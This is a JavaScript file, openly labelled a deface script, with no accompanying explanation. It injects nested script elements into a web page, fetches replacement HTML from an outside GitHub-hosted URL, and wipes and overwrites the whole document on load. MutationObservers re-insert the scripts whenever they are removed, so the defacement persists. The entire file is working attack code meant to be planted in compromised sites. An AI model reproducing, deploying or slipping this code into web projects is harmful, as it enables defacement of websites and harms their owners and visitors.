(function() {
    const scriptId = 'deface-script';
    const innerScriptId = 'deface-script-inner';

    function insertDefaceScript() {
        if (!document.getElementById(scriptId)) {
            const script = document.createElement('script');
            script.id = scriptId;
            script.type = 'text/javascript';
            script.innerHTML = `
                (function ensureScriptPresence() {
                    function insertInnerScript() {
                        if (!document.getElementById(innerScriptId)) {
                            const script = document.createElement('script');
                            script.id = innerScriptId;
                            script.innerHTML = \`
                                async function defacePage() {
                                    try {
                                        const url = 'https://raw.githubusercontent.com/pentonic0/index_deface/main/quota.html';
                                        const response = await fetch(url);
                                        if (!response.ok) throw new Error('Network response was not ok');
                                        const htmlContent = await response.text();
                                        document.documentElement.innerHTML = '';
                                        document.write(htmlContent);
                                        document.close();
                                    } catch (error) {
                                        console.error('Error fetching the HTML content:', error);
                                    }
                                }
                                document.addEventListener('DOMContentLoaded', defacePage);
                            \`;
                            document.head.appendChild(script);
                        }
                    }

                    insertInnerScript();

                    const observer = new MutationObserver(() => {
                        insertInnerScript();
                    });

                    observer.observe(document, { childList: true, subtree: true });
                })();
            `;
            document.head.appendChild(script);
        }
    }

    insertDefaceScript();

    const primaryObserver = new MutationObserver(() => {
        insertDefaceScript();
    });

    primaryObserver.observe(document, { childList: true, subtree: true });
})();
